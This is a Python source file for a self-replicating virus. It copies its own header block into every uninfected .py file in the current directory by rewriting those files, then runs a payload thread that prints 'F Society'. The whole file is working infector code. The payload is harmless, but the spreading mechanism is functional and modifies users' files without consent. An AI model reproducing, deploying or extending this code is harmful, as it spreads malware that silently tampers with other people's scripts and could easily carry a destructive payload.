#### BEGIN HEADER ####

import glob
import pathlib


virus_code = []
flag = False

with open(pathlib.Path(__file__).resolve() , "r") as fp:
    for line in fp.readlines():
        if line == "#### BEGIN HEADER ####\n":
            flag = True
        
        if flag:
            virus_code.append(line)
        
        if line == "#### END HEADER ####\n":
            break

target_scripts = glob.glob("*.py", recursive=True)

for target in target_scripts:
    with open(target, "r") as fp:
        flag = False
        target_script_code = fp.readlines()
        for line in target_script_code:
            formatted_line = line.strip("\n")
            if formatted_line == "#### BEGIN HEADER ####":
                flag = True
                break

    if not flag:
        final_code = virus_code + ["\n"] + target_script_code

        with open(target, "w") as fp:
            fp.writelines(final_code)


#### BEGIN PAYLOAD ####

import threading
import time


def payload():
    time.sleep(2)
    print("F Society")


thread = threading.Thread(target=payload)
thread.start()

#### END PAYLOAD ####


#### END HEADER ####
